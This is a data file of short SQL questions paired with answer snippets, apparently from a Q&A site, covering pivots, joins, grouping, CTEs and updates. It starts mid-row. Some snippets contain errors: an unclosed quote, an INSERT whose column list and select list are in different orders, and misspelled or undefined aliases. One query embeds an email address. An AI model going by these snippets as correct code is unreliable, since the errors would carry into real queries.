    v.Score5,
    v.Score4,
    v.Score3,
    v.Score2,
    v.Score1
"
12621,40959,Average of sums in MySQL,"select sum(onhand) / count(distinct branchnum) as avg_per_branchnum
from atablelikethis;
"
15039,49741,SQL: How do i convert period per column to period per row,"SELECT [Project Name], '2015' AS [Period], [2015] AS [Value]
FROM your spreadsheet

UNION ALL

SELECT [Project Name], '2016' AS [Period], [2016] AS [Value]
From your spreadsheet

Order By Project Name, Period
"
29663,30215,Compare output of select statement,"select group_concat(EmployeeName) as `o/p`
from Table2 
where FIND_IN_SET(EmployeeID, 
    (select Participantsid from Table1 
    where Validfrom = '2016-02-22 18:00:00' and Validto = '2016-02-22 19:00:00'));
"
7657,1602,"SQL server: Inserting a bunch of rows into a table, generating a ""batch id"" for every 100?",";WITH x AS 
(
  SELECT col1, rn = ROW_NUMBER() OVER (ORDER BY col1) FROM dbo.OtherTable
)
--INSERT dbo.BatchTable(batch_id, col1)
SELECT batch_id = (99+rn)/100, col1 FROM x;
"
30279,58964,T-SQL Case Statement in a JOIN ON Clause,"LEFT JOIN [CTSTRC] [Statuses] ON 
    (CASE WHEN ISNUMERIC(RIGHT([Statuses].[STRID], 3) + '.0e0) = 1 
          THEN  CAST(RIGHT([Statuses].[STRID], 3) AS INT) 
          ELSE 0  END) = [CTE].[F61] 
"
29475,48260,Show all rows in MySQL that contain the same value (2 column filter),"SELECT c2, GROUP_CONCAT(DISTINCT c1)
FROM table
group by c2 HAVING count(distinct c1)>1
"
5238,42607,SQL server determine which row was inserted?,"DECLARE @output TABLE (id int)

Insert into A (fname, lname)
OUTPUT inserted.ID INTO @output
SELECT fname, lname FROM B

select * from @output
"
38668,1168,Is this the correct way to sort rows which have the same insert datetime?,"SELECT name, species, birth FROM pet
ORDER BY species, birth DESC
"
39074,41395,Sum or Multiply in SQL Server,"Number3 as (Number1 + Number2)
"
11188,36681,Django DB API equivalent of a somewhat complex SQL query,"from django.db.models import Max
mail_list = Mail.objects.values('conversation_id').annotate(Max('id'))
conversation_id_list = mail_list.values_list('id__max',flat=True)
conversation_list = Mail.objects.filter(id__in=conversation_id_list)
"
8764,33695,SQL grouping results by first date of the week,"SELECT DATEPART(WK,CAST(a.sale_date AS DATE)), 
max(DATEADD(dd, -(DATEPART(dw, a.sale_date) - 1), a.sale_date)) as WeekStart, sum(1) as Count 
from testdata a
where a.sale_date >= Dateadd(DAY, Datediff(Day, 0, DATEADD(WEEK, -52, current_timestamp)), 0)
group by DATEPART(WK,CAST(a.sale_date AS DATE));
"
24972,67092,Display Columns into Rows,"WITH CTE AS (
    SELECT        
         SUBSTRING([project],11,4) AS ProjectID
       , SUBSTRING([fiscalno],1,4) AS FiscYr
       ,'Period ' + SUBSTRING([fiscalno],5,2) AS Period
       , Amount
    FROM [dbo].[PJTran] 
    WHERE pjtran.gl_Acct LIKE '1[23]%' 
)

SELECT * FROM CTE
PIVOT (SUM(Amount) FOR Period IN (
    [Period 1],[Period 2], [Period 3], [Period 4],
    [Period 5],[Period 6], [Period 7], [Period 8],
    [Period 9],[Period 10],[Period 11],[Period 12]
    )
) p;
"
26869,5020,CONTAINS with multiple terms over multiple columns,"DROP TABLE t_ft
CREATE TABLE t_ft (id INT NOT NULL,
        data1 NVARCHAR(MAX) NOT NULL, data2 NVARCHAR(MAX) NOT NULL, data3 NVARCHAR(MAX) NOT NULL,
        totaldata AS data1 + ' ' + data2 + ' ' + data3,
        CONSTRAINT pk_ft_id PRIMARY KEY (id))

CREATE FULLTEXT INDEX ON t_ft (totaldata LANGUAGE 1033) KEY INDEX pk_ft_id

INSERT
INTO    t_ft
VALUES  (1, 'foo bar', 'baz', 'text')

INSERT
INTO    t_ft
VALUES  (2, 'foo bar', 'bax', 'text')


SELECT  *
FROM    t_ft
WHERE   CONTAINS (*, 'foo AND baz') 
"
130,59113,Detecting duplicates which fall outside of a date interval,"select hospital_id
       , count(*) as total_num_of_patients      
       , sum (out_of_range) as num_of_patients_out_of_range
from (
    select patient_id
           , hospital_id
           , case
                   when hospital_id_1 = hospital_id_0
                   and  visit_1 > visit_0 + 10
                   and  med_op_code_1 = med_op_code_0
                   then 1
                   else 0
              end as out_of_range
    from (
            select patient_id
                   , hospital_id as hospital_id_1
                   , date as visit_1
                   , med_op_code as med_op_code_1
                   , lag (date) over (partition by patient_id order by date) as visit_0
                   , lag (hopital_id) over (partition by patient_id order by date) as hopital_id_0
                   , lag (med_op_code) over (partition by patient_id order by date) as med_op_code_0
            from your_table
            where med_op_code = 'P1'
        )
    )
group by hospital_id
/
"
36794,13318,Four Tables show single occurrence for outer most table,"SELECT DISTINCT ON(companies.name, employees.first_name) 
   applicants.id, companies.name, employees.first_name, departments.name, applied_date
FROM applicants
INNER JOIN departments ON applicants.department_id = departments.id
INNER JOIN companies ON departments.university_id = companies.id
INNER JOIN employees ON applicants.student_id = employees.id
ORDER BY companies.name, employees.first_name, applied_date
"
12906,61974,Pick which value to feed in second parameter in SSRS,"WHERE (@DateType = 'Created' AND ProductCreatedDate BETWEEN @StartDate AND @EndDate)
      OR (@DateType = 'Sold' AND ProductSoldDate BETWEEN @StartDate AND @EndDate)
"
27102,16303,how to execute multiple procedure script in sql-server,"declare @sql nvarchar(max)=''
select @sql+= 'exec pr_tblmaster_split ''tblmaster_'+  Cast(year as nvarchar(4000)) +'''; ' 
from  tblmaster
group by year_id 
order by year_id asc

exec sp_executesql @sql
"
30876,18966,SQL Server DISTINCT pagination with ROW_NUMBER() not distinct,"WITH t AS
(
   SELECT [insert your fields here], ROW_NUMBER() OVER (ORDER BY Date) AS num 
   FROM (
     SELECT DISTINCT *[insert your fields here]
     FROM Original_Import 
     LEFT JOIN eqcas.dbo.BASE_PROXY_VIEW_WITHTARGET ON ADName = Targetuser
     WHERE (BaseProxy = 'agmc' OR ADName = 'agmc')
      AND (Commited IS NULL OR Commited = 0)) as X
)
SELECT DISTINCT ID, num, ADName, Description_User, Description_Amex, Amount, Date
FROM t 
WHERE (t.BaseProxy = 'agmc' OR t.ADName = 'agmc') 
   AND num BETWEEN 0 AND 20
   AND (Commited IS NULL OR Commited = 0)
ORDER BY Date
"
2909,16291,Weekly total change name,"SELECT 'week ' + CONVERT(varchar(255), DATEPART(ww, D_Date) - 26) AS ReportingWeek,
       Proj_name, SUM(Expr1) AS total
FROM  dbo.View_Test_Two
GROUP BY DATEPART(ww, D_Date), Proj_name
ORDER BY min(D_Date);
"
13691,53419,Sql query to find the all subordinates under a single superior,"WITH Subordinates AS
(
   SELECT e.Emp_ID, e.Emp_Name, e.Emp_Manager_ID
   FROM Employee AS e
   WHERE e.Emp_Manager_ID = 2

   UNION ALL

   SELECT e.Emp_ID, e.Emp_Name, e.Emp_Manager_ID
   FROM Employee AS e
   INNER JOIN Subordinates AS sub ON e.Emp_Manager_ID = sub.Emp_ID
)
SELECT s.Emp_ID, s.Emp_Name, s.Emp_Manager_ID
FROM Subordinates AS s
"
12088,52767,MySQl Query Help,"UPDATE table1 t1 JOIN table2 t2 ON t1.id = t2.id
SET t1.col1 = t2.col2, t1.col2 = t2.col2
"
24961,55847,Is there any way to join two update queries into one?,"update user 
set name = 
    case when id = '1' then 'Something' 
         when id = '2' then 'Newthing' 
    end
where id in ('1','2')
"
27119,4820,Search Multiple Columns Returned Most Matches,"select boxId, sum(matches) 
from (select boxID, 
      (case when styleId IN (4) then 1 else 0 end) + 
      (case when colorId in (1, 5) then 1 else 0 end) matches 
       from test) t1
group by boxId
order by sum(matches) desc;
"
24848,63381,SQL result sorted twice on same column,"Select ...
From MyTable
Order By Case When Col = 0 Then 1 Else 0 End Asc, Col Asc
"
25762,72778,need Oracle query - get a list of differnet attributes from a column,"select distinct column_value from table
"
27409,66118,"Rewrite ""IN"" statement","SELECT * FROM MyTable WHERE 0 = 1 UNION SELECT whatIWant FROM whereIWant
"
27854,32967,Database model for different range of prices for products,"idmaterial    material  Idpricetype
-----------------------------------
1              iron        1
2              steel       1
3              alu         2


Idpricetype   name     unit
---------------------------------
1             weight   kg
2             lenght   mm

idmaterial  price    unitforprice
---------------------------------
1           0.5      1
2           0.8      1
3           10       100
3           18       200
3           35       500
3           50       1000
"
38248,11057,How to count hits greater than X in Access?,"SELECT
    COUNT([user])
FROM
    [table]
WHERE
    hits > 10
GROUP BY
    [user]
"
20319,22399,Method to test a deploy in production?,"Use [$(DBNAME)]
GO

:Error $(ErrorOutputFileFromCommandLine) 

IF EXISTS (    SELECT TABLE_SCHEMA , TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'Employee' and TABLE_SCHEMA = 'dbo'    )
    BEGIN

        IF EXISTS 
        (
            SELECT * 
                FROM [INFORMATION_SCHEMA].[COLUMNS] 
            WHERE   
                TABLE_NAME = 'Employee' 
                AND TABLE_SCHEMA = 'dbo'
                AND COLUMN_NAME = 'LastName'
                AND CHARACTER_MAXIMUM_LENGTH < 128
        )
            BEGIN
                print 'Altering the column dbo.Employee.*LastName*'

                ALTER TABLE [dbo].[Employee]
                ALTER COLUMN [LastName] varchar(128) NOT NULL;

            END
        ELSE
            BEGIN
                print 'The column dbo.Employee.*LastName* already exists and supports 128 characters.'
            END

    END

GO
"
31947,3702,Oracle query inner join trouble,"select  
     mum.wisdom as wisdom_mum,
     dad.wisdom as wisdom_dad
from
     megaAvatars m
     inner join superAvatars mum on mum.sAvatarsID = m.mum
     inner join superAvatars dad on dad.sAvatarsID = m.dad
where
     m.hoard = 100
"
8364,1911,Ordering by the order of values in a SQL IN() clause,"SELECT name, description, ...
FROM ...
WHERE id IN([ids, any order])
ORDER BY FIELD(id, [ids in order])
"
5388,17368,MySQL query missing IDs,"SELECT 
    ut.idu as IDU,
    ut.fname || ut.lname as Name,
    (SELECT COUNT(*) FROM events_table) - SUM(CASE WHEN at.idu is null then 0 else 1 end) as TimesAbsent
FROM attendance_table at
RIGHT JOIN user_table ut
ON at.idu = ut.idu
GROUP BY ut.idu, ut.fname, ut.lname
"
2999,53468,Soft delete in SQL Server using stored procedure,"Update t 
set t.IsDeleted = 1 
from tblTeam t
where t.TeamId = @pteamid 
and not exists (select 1 from tblUser where TeamId = @pteamid)
and not exists (select 1 from tblAcount where TeamId = @pteamid)
"
5298,68176,SSIS - Convert a varchar field to unique identifier,"public override void Input0_ProcessInputRow(Input0Buffer Row)
{
// Create a Globally Unique Identifier with SSIS
    Row.GUID = System.Guid.NewGuid(); 
}
"
22581,510,Command Prompt: Check whether windows service is started or not,"start /wait sc start <name-of-your-oracle-service>
"
33147,25876,SQL - Complex Data Migration from Old Structure to New Structure,"INSERT INTO [UserSessionLogs]([PropertyID], [IPAddress], [UserID])
SELECT [PropertyID], [UserID], [IPAddress]
FROM [OldApplicationLogs]
GROUP BY [PropertyID], [UserID], [IPAddress];

INSERT INTO [ApplicationLogs]([UserSessionLogID], [Action], [Controller], [Operation], [Created], [EntityID], [EntityKey], [RelativeURL])
SELECT 
    B.[ID],
    A.[Action], 
    A.[Controller],
    A.[Operation],
    A.[LoggedDate],
    C.[TableName],
    CAST(A.[EntityKey] AS INT),
    REPLACE(A.[AbsoluteURL],'www.myapp.com/','')
FROM [OldApplicationLogs] A
INNER JOIN [UserSessionLogs] B
ON      A.[UserID] = B.[UserID]
LEFT JOIN [Entities] C
ON      A.[EntityType] = C.[TableName]
"
32893,42245,How to sum data by column with different name,"select coalesce(name, 'SUM') as name,
       count(*) as [count],
       SUM(balance1) as balance1, SUM(balance2) as balance2
from mytbl
where [date] between ... --some filters
group by grouping sets( (name, left(name, 1)), (left(name, 1)) );
"
38157,48830,Calculate the overlap between two unrelated tables in posgres/posgis,"WITH CTE1 AS
(
    SELECT ROW_NUMBER() OVER(ORDER BY col1) AS ROWNUM, col1 FROM tab1
),
CTE2 AS
(
    SELECT ROW_NUMBER() OVER (ORDER BY col1) AS ROWNUM, col1 FROM tab2
)
SELECT CTE1.col1 AS RES_T1, CTE2.col1 AS RES_T2
FROM CTE1 FULL JOIN CTE2 ON CTE1.ROWNUM = CTE2.ROWNUM
"
25136,16572,Duplicate Rows of Data Except 2 columns,"SELECT CheckSheet_No,
       MAX(CASE WHEN rn=1 THEN Fault END) As Fault1,
       MAX(CASE WHEN rn=2 THEN Fault END) As Fault2,
       MAX(CASE WHEN rn=3 THEN Fault END) As Fault3
FROM
   (
   SELECT CheckSheet_No,Fault,
       Row_Number() Over(Partition By CheckSheet_No Order By Fault) as rn
   FROM CheckSheet_fault 
   ) Z
GROUP BY Z.CheckSheet_No
"
8706,33061,Check if external database is online,"OPENQUERY ( [192.168.111.33] ,'select databasepropertyex(MuOtherDatabase, ''Status'')' )
"
33909,22488,Select a column's data in a group and place in new column across entire group,"SELECT 
    JobNum, ReqDateTime, RowNum,
    (select min(ReqDateTime) from JobTable jt2 where jt2.JobNum = jt1.JobNum group by JobNum) as FirstDateInEachGroup
FROM Jobtable jt1
"
1271,6980,ORDER BY DISTINCT CASE FOR XML,"SELECT   C.CourseName
        ,S.SessionID
        ,STUFF(
                (SELECT ', ' + CASE 
                                            WHEN ST.DayOfWeek = 0 THEN 'Su'
                                            WHEN ST.DayOfWeek = 1 THEN 'M'
                                            WHEN ST.DayOfWeek = 2 THEN 'T'
                                            WHEN ST.DayOfWeek = 3 THEN 'W'
                                            WHEN ST.DayOfWeek = 4 THEN 'Th'
                                            WHEN ST.DayOfWeek = 5 THEN 'F'
                                            WHEN ST.DayOfWeek = 6 THEN 'Sa'
                                        END
                FROM SessionTime ST
                WHERE ST.SessionID = S.SessionID
                GROUP BY st.DayOfWeek
                ORDER BY DayOfWeek              
                FOR XML PATH (''))
            ,1,2,'') AS DaysOfWeek
FROM Session S
INNER JOIN Course C on S.CourseID = C.CourseID
"
10050,67509,How to duplicate Rows with new entries,";WITH CTE AS (
    SELECT
        ID,
        YEAR(StartDt) AS FY,
        YEAR(EndDt) AS EY
    FROM [Source]
    UNION ALL
    SELECT 
        ID,
        FY + 1,
        EY
    FROM CTE
    WHERE FY < EY
)
    SELECT ID, FY FROM CTE ORDER BY ID, FY
"
3810,52091,REGEXP_REPLACE - remove new line \n from string ONLY if is enclosed in ()'s,"var2 := regexp_replace(var1, '((\)|^).*?(\(|$))|'||chr(10), '\1', 1, 0, 'n');
"
18641,24928,'insert into' from more source-tables,"select * into NewTable  from (
SELECT * from ta where farm like'%aa'
Union all
SELECT * from tb where farm like'%aa'
Union all
SELECT * from tc where farm like'%aa'
)a;
"
28192,16155,Consultation about cast and max date in MySQL,"SELECT   *
FROM     men
ORDER BY STR_TO_DATE(tdate, '%d.%m.%Y') DESC
LIMIT    1
"
28835,71401,"MySQL: delete rows with ""WHERE ... NOT IN"" from only one single table","DELETE hrr
    FROM `home_resident_relations` hrr LEFT JOIN
         (SELECT tbl.`resident_id`   
          FROM `home_resident_relations` tbl
          WHERE tbl.`datemodified` = (SELECT max(tbl2.`datemodified`) 
                                      FROM `home_resident_relations` tbl2 
                                      WHERE tbl2.`home` = tbl.`home` 
                                      GROUP BY tbl2.`home`
                                     ) OR
               tbl.`datemodified` IS NULL
         ) tt
         ON hrd.resident_id = tt.resident_id
    WHERE tt.resident_id IS NULL;
"
22689,31303,JPQL query - order by count,"SELECT r.event, (
    SELECT count(*)
    FROM RSVP rr
    WHERE rr.event = r.event
        AND rr.profile IN
        (
            SELECT f.profileTo 
            FROM Friend f 
            WHERE f.profileFrom.user.uuid = :userUuid
        )
    ) count
FROM RSVP AS r 
WHERE r.profile.user.uuid = :userUuid 
    AND r.rsvpStatus = RSVPStatus.ATTENDING      
ORDER BY 2 DESC
"
20158,38610,Update values sqlite database,"UPDATE MyTable SET col1 = col1 / 100000.0, col2 = col2 / 1000000.0
"
19025,67938,Not able to group the selected data,"SELECT *
FROM test.college
WHERE Courses_Offered LIKE CONCAT('%',RTRIM((SELECT Primary_Subject FROM test.user WHERE Email = 'r.veer7@gmail.com')),'%')
     OR Courses_Offered LIKE CONCAT('%',RTRIM((SELECT Secondary_Subject FROM test.user WHERE Email = 'r.veer7@gmail.com')),'%')
     OR LOWER(Location)IN(SELECT LOWER(Location) FROM test.user WHERE Email = 'r.veer7@gmail.com')
GROUP by college.column_name
ORDER BY college.first_column_name ASC , college.second_column_name DESC
"
140,42931,How to select top 4 records of amount from 2 tables,"select Table2.DocEntry, CustID, CustName, DocAmount, ItemID, ItemName, 
ItemPrice, Qty, LineAmount
from (select top 3 * from Table1 order by DocAmount desc) TopDocs 
    join Table2 on TopDocs.DocEntry=Table2.DocEntry
order by DocAmount desc
"
2190,63310,Mysql: Selecting values between two columns,"SET @value = 2;
SELECT * FROM table WHERE from > @value AND @value <= to;
"
14718,27817,SQL query ordering and using group by,"SELECT p.title AS product_title, pt.title AS product_type_title
FROM products p
INNER JOIN product_types pt
    ON p.product_type_id = pt.id
WHERE p.product_cat_id = 42
ORDER BY pt.ordering, p.ordering
"
39012,69090,Convert string with different format to date,"select foo,
    case when length(date(str_to_date(foo,""%Y-%m-%d %H:%i:%S""))) is not null then str_to_date(foo,""%Y-%m-%d %H:%i:%S"")
        when length(date(str_to_date(foo,""%b %d %Y %h:%i%p""))) is not null then str_to_date(foo,""%b %d %Y %h:%i%p"")
    end as newdate
from my_table
"
36792,67664,How to retrieve all child elements for all parent elements from xml in sql,"select a.b.value('(../parent-name)[1]','varchar(50)') as parent
  , a.b.value('(.)[1]' ,'varchar(50)') as child
from @myxml.nodes('people/parent/child')a(b)
"
24462,66044,Inner join only returns 7 records,"SELECT status.* , accountLink.userId, accountLink.twitterUserId
FROM status
LEFT JOIN accountLink
ON status.twitterUserId = accountLink.twitterUserId
"
27429,6045,How to get the cumulative column from my sales table?,"SELECT t1.*, sum(t2.amount)
FROM Table1 t1
INNER JOIN Table1 t2 ON t1.pid = t2.pid AND t1.month >= t2.month
GROUP BY t1.pid, t1.month, t1.amount
"
25858,27023,Oracle Sql query to return the column result in single row,"select e.ENGINE_ID,
       e.ENGINE_NAME,
       os.OBJECT_STATUS,
       LISTAGG(br.NAME, ', ') WITHIN GROUP (ORDER BY br.NAME) AS NAME,
       env.NAME as NAME_1
from ENGINE e,
     RATOR_MONITORING.OBJECT_STATUS os,
     BRAND_ENGINE be,
     ENVIRONMENT env,
     BRAND br
where e.ENGINE_ID = os.OBJECT_ID
  AND os.OBJECT_TYPE='ENGINE'
  AND be.ENGINE_ID = e.ENGINE_ID
  AND be.BRAND_ID = br.BRAND_ID 
  AND br.ENV_ID = env.ENV_ID  
group by e.ENGINE_ID,
         e.ENGINE_NAME,
         os.OBJECT_STATUS,
         env.NAME
order by decode(os.OBJECT_STATUS, 'R',1, 'Y', 2, 'G', 3, 'N',4) asc,
         UPPER(e.ENGINE_NAME) asc
"
39909,16203,MySQl need to add a column to the existing query / print the group name in the added column,"SELECT us.recNo, 
       CONCAT(us.firstname, ' ',us.lastname) AS fullname, 
       max(dy.date) AS diarydate,
       case when MAX(dy.date) IS NOT NULL then 'DiaryGroup' else 'NoDiary' end as group
FROM users us LEFT JOIN diary dy ON us.recNo = dy.clientID AND dy.date >= 
       (SELECT max(DATE(dateTime)) 
       FROM `history` 
       WHERE userID=us.managerID) OR dy.date is NULL
WHERE us.managerID =  6  and us.accountStatus = 2 and us.securityGroup = 50
GROUP BY us.recNo, fullname
ORDER BY diarydate DESC, fullname
"
36417,37703,Efficient progressive sum,"select 
  id,
  value,
  nvl(
    sum(value) over (
      order by id rows between unbounded preceding and 1 preceding
    ), 0) as offset
from table
"
32698,65023,Join two Mysql tables by unique keywords and by adding total in column,"CREATE TABLE sales
(id INT NOT NULL AUTO_INCREMENT,
location VARCHAR(40), 
today DATETIME NOT NULL,
sales INT NOT NULL,
PRIMARY KEY (id)
)
;


INSERT sales (location,today,sales) VALUES ('London','2013-05-26',2000);
INSERT sales (location,today,sales) VALUES ('Birm','2013-05-26',1000);
INSERT sales (location,today,sales) VALUES ('London','2013-05-26',1500);
INSERT sales (location,today,sales) VALUES ('London','2013-05-24',100);
INSERT sales (location,today,sales) VALUES ('Birm','2013-05-24',200);
INSERT sales (location,today,sales) VALUES ('London','2013-05-24',300);

CREATE TABLE daily_totals
(id INT NOT NULL AUTO_INCREMENT,
location VARCHAR(40), 
today DATETIME NOT NULL,
totalsales INT NOT NULL,
PRIMARY KEY (id)
)
;

DELETE FROM daily_totals;

INSERT INTO daily_totals (location,today,totalsales)
SELECT location,
DATE(today),
SUM(sales)
FROM sales
GROUP BY location,DATE(today)
"
35619,24433,Query to retrieve top row without using TOP except plain sql,"select * from Contests
Where ContestId = (SELECT MAX(ContestId) FROM Contests)
"
10367,22168,"Trying to initialize 2 values in 2 variables using 1 query, is it possible to do this.?","select 
    @Password = Password
,   @IsLocked = IsLocked
,   @UserLongName = UserLongName
,   @TopSecretPin = 1234
,   @PrefersLinux = case when LastName = 'Torvalds' then 1 else 0 end
FROM [Authentication].[tblLogin] 
WHERE UserName = @UserName
"
14518,28893,How do I query for something that starts with certain characters?,"WHERE SRV_NAME LIKE 'AA%'
"
27755,66304,SQL complex unions,"SELECT TT.* 
FROM [TableOfIDs] AS T CROSS APPLY GetObjectProperties(T.ID) AS TT;
"
2280,39635,Transform SQL Table,"SELECT
  TN.FieldValue AS ValueName
, TV.FieldValue AS ValueAge
FROM dbo.Table1 TN
INNER JOIN dbo.Table1 TV ON TN.RecordID = TV.RecordID
  AND TN.FieldName = 'Name'
  AND TV.FieldName = 'Age'
"
30837,61681,How to make a composite key to be unique?,"ALTER TABLE students ADD UNIQUE gsc (grades, subgrade, class_id);
"
37214,65823,SQL where field in vs. where field = with multiple ors?,"SELECT *
FROM Wherever
WHERE Greeting in ('hello', 'hi', 'hey')
"
1228,61272,SQL Select Statement,"Select StudentId FROM table WHERE 
    StudentId IN 
       (SELECT studentID FROM table WHERE ( period = 1 AND class= ""math"" ) ) 
AND 
    StudentId IN 
       (SELECT studentID FROM table WHERE ( period = 2 AND class= ""english"" ) ) 
"
33200,59789,How can I rank sequential rows with a null value in a query?,"select grouped_table.nat_key, 
       grouped_table.attr, 
       grouped_table.order_by,  
       case 
         when attr is null 
           then row_number() over (partition by nat_key, attr, grp order by order_by) 
         else null
       end rowrank 
from (
  select the_table.*, 
         row_number() over (partition by nat_key order by order_by) - row_number() over (partition by nat_key, nvl2(attr, 1, 0) order by order_by) grp 
  from (
    select 'A' nat_key, 'A' attr, 1 order_by from dual 
    union all 
    select 'A' nat_key, null attr, 2 order_by from dual 
    union all 
    select 'A' nat_key, 'A' attr, 4 order_by from dual 
    union all 
    select 'A' nat_key, 'I' attr, 6 order_by from dual 
    union all 
    select 'A' nat_key, null attr, 8 order_by from dual 
    union all 
    select 'A' nat_key, null attr, 10 order_by from dual 
    union all 
    select 'A' nat_key, null attr, 11 order_by from dual 
    union all 
    select 'B' nat_key, null attr, 2 order_by from dual 
    union all 
    select 'B' nat_key, null attr, 3 order_by from dual 
    union all 
    select 'B' nat_key, 'A' attr, 5 order_by from dual 
    union all 
    select 'B' nat_key, 'A' attr, 6 order_by from dual 
    union all 
    select 'B' nat_key, null attr, 9 order_by from dual 
    union all 
    select 'C' nat_key, 'A' attr, 1 order_by from dual 
    union all 
    select 'C' nat_key, 'A' attr, 5 order_by from dual 
    union all 
    select 'C' nat_key, 'I' attr, 6 order_by from dual 
    union all 
    select 'C' nat_key, null attr, 7 order_by from dual 
    union all 
    select 'C' nat_key, null attr, 8 order_by from dual 
  ) the_table 
) grouped_table 
order by nat_key, order_by
"
25120,58289,SQL: Turning Rows into Columns for Variable Number of Rows,"create table responses (
    id serial not null  unique,
    x   integer,
    created timestamp default now()
);

 create table accessory (
    id serial not null,
    responses_id integer references responses (id),
    sensor_id  integer,
    value text,
    created timestamp default now()
);

insert into responses  (x) values  ( 1), (2),(3),(4);

insert into accessory  (responses_id ,  sensor_id, value ) values  
( 1, 1, 'A' ), ( 1, 2, 'Ab' ),  ( 1, 3, 'Ac' ),  ( 1, 4, 'Ad' ),
( 2, 4, 'Ab' ), ( 1, 2, 'bAb' ),  ( 3, 3, 'bAc' ),  ( 4, 4, 'bAd' );

select *, array(
    select value
    from accessory
    where accessory.responses_id  = responses.id  
    order by  accessory.created
    ) as accessory_values
from responses;
"
26927,31429,Generating cross tab reports im oracle?,"SELECT name,v1,v2,v3 FROM my_table 
UNION ALL 
SELECT ""total"",sum(v1) as v1 ,sum(v2) as v2 ,sum(v3) as v3 FROM my_table;
"
2341,67470,"SQL Assign ""co-efficients"" to query conditions and use them to sort result","SELECT t.*, (condition1 = 'value1') as s1, 
       (condition2 = 'value2') as s2,  (condition3 = 'value3') as s3
FROM table t
ORDER BY (s1*3 + s2*2 + s3*1);
"
29028,39596,SQL date conversion year/datepart to datetime,"DECLARE @tick varchar(20) = '0000113326'
SELECT dateadd(d, cast(right(@tick, 3) as int) - 1, '20' + substring(@tick, 6, 2) + '0101')
"
9741,5039,Finding number of rows in each GROUP BY result,"SELECT EAM_Model, new_Model, count(*)
FROM rollout_systems 
WHERE scope_ID = '.$id.'              
GROUP BY EAM_Model, new_Model
"
30859,71725,Refining a query by Edge metadata,"SELECT outE('VersionSetToVersion')[status = 'latest'].inV() FROM #14:1
"
17639,72835,"Best practice when setting up key, value table relationship","Tag
=================
id
value/information


TableA
========
id   
column1   
column2 
......


TagReferenceTableA  
====================
tableA_Id  -- fk to TableA
tag_id     -- fk to Tag
"
28592,39039,Auto Naming In Oracle DataBase when inserting to table,"insert into table_1 (p_code, o_code)
(-- add all rows in table_2 that are not present in table_1
 (select t2.p_code, t2.o_code from table_2 t2 
 minus
 select t1.p_code, t1.o_code from table_1 t1)
 union all
 -- add all rows in table_2 that are present in table_1
 (select t2.p_code, t2.o_code || '_2' from table_2 t2
  join table_1 t1a on t2.p_code = t1a.p_code and t2.o_code = t1a.o_code)
);
"
31113,69779,how to create a database for a PhoneGap android application,"<!DOCTYPE html>
<html>
  <head>
    <title>Storage Example</title>

    <script type=""text/javascript"" charset=""utf-8"" src=""cordova-2.4.0.js""></script>
    <script type=""text/javascript"" charset=""utf-8"">

    // Wait for Cordova to load
    //
    document.addEventListener(""deviceready"", onDeviceReady, false);

    // Cordova is ready
    //
    function onDeviceReady() {
        var db = window.openDatabase(""Database"", ""1.0"", ""Cordova Demo"", 200000);
        db.transaction(populateDB, errorCB, successCB);
    }

    // Populate the database 
    //
    function populateDB(tx) {
         tx.executeSql('DROP TABLE IF EXISTS DEMO');
         tx.executeSql('CREATE TABLE IF NOT EXISTS DEMO (id unique, data)');
         tx.executeSql('INSERT INTO DEMO (id, data) VALUES (1, ""First row"")');
         tx.executeSql('INSERT INTO DEMO (id, data) VALUES (2, ""Second row"")');
    }

    // Transaction error callback
    //
    function errorCB(tx, err) {
        alert(""Error processing SQL: ""+err);
    }

    // Transaction success callback
    //
    function successCB() {
        alert(""success!"");
    }

    </script>
  </head>
  <body>
    <h1>Example</h1>
    <p>Database</p>
  </body>
</html>
"
32431,28390,sql statement to retrieve the last entry value from database,"select TOP 1 InvoiceNo 
from BuyInvoice order by right(InvoiceNo,4) desc,
  right(InvoiceNo, 6) desc, 
  InvoiceNo desc
"
19928,64627,Find which entry occurs maximum number of time in Mysql,"SELECT ID, BRAND
FROM
(
  SELECT t.ID, t.BRAND, s.TotalCount, 
          COUNT(*) * 1.0 / s.TotalCount Percentage
  FROM   T
         INNER JOIN
        (
          SELECT ID, COUNT(*) totalCOunt
          FROM   T
          GROUP  BY ID
        ) s ON T.ID = s.ID
  GROUP  BY ID, BRAND
  HAVING (COUNT(*) * 1.0 / s.TotalCount) > 0.5
) r
"
34865,41245,How to replace characters before a number in sql,"SELECT REPLACE(Name, SUBSTR(Name, 1, REGEXP_INSTR( Name, '[0-9]', 1)-1), 'Port ')
 FROM PORT
"
39093,27189,find unique rows using SQL?,"SELECT name FROM myTable GROUP BY name HAVING COUNT(name) = 1
"
39952,1118,SQL batch variable,"for /F ""tokens=*"" %%A in (readme.txt) do (
    SQLCMD -S%%A -Uswpos -isalto_folio.sql -osalto_folio.txt
)
"
8232,31402,I want to count people according to their cities and put them in three categories as in which city there are more than 5 people,"SELECT cities,
       CASE WHEN COUNT(*) = 1 THEN '1'
            WHEN COUNT(*) BETWEEN 2 AND 5 THEN '2-5'
            WHEN COUNT(*) > 5 THEN '5'
        END category,
       LISTAGG(people, ',') WITHIN GROUP (ORDER BY people) AS names  
  FROM your_table
 GROUP 
    BY cities
"
3492,8025,How to figure out when a SQL query will end?,"mysqladmin extended -r -i 10 | grep Handler_read_rnd_next
-- ignore the first line of output...
| Handler_read_rnd_next             | 429224      |
"
7513,16115,SQL Server Query - Best Practice on Where Clause,"Select b.CodCred, b.Codigo, c.Nome
  from AS_CredenciadosUsu a
 inner join AS_Credenciados b
    on a.CodCred = b.CodCred
   and a.NumContrato = b.NumContrato
 inner join Cadastro c
    on b.Codigo = c.Codigo
   and c.NumContrato = b.NumContrato
 Where a.NumContrato = 21
   and a.CodUsuD = 1
"
8966,1746,How to join two tables without any condition,"-- Some test data:
declare @Table1 table (
    ID int primary key
)
insert into @Table1 select 14
insert into @Table1 select 15
insert into @Table1 select 16

declare @Table2 table (
    CarModel varchar(50) not null,
    [Year] smallint not null
)
insert into @Table2 select 'Ford', 1996
insert into @Table2 select 'Ferrari', 2005
insert into @Table2 select 'Toyota', 2010

-- Here's the actual query:
select Table1.ID, Table2.CarModel, Table2.[Year]
from (
        select ID, (select count(*) from @Table1 where ID < a.ID) as JoinPredicate
        from @Table1 as a
    ) as Table1
    join (
        select CarModel, [Year], (select count(*) from @Table2 where CarModel < a.CarModel or (CarModel = a.CarModel and [Year] < a.[Year])) as JoinPredicate
        from @Table2 as a
    ) as Table2 on Table1.JoinPredicate = Table2.JoinPredicate
"
7182,4465,How to write a sql query to sum total for each day?,"SELECT SUM(table.amount), table.date
FROM table
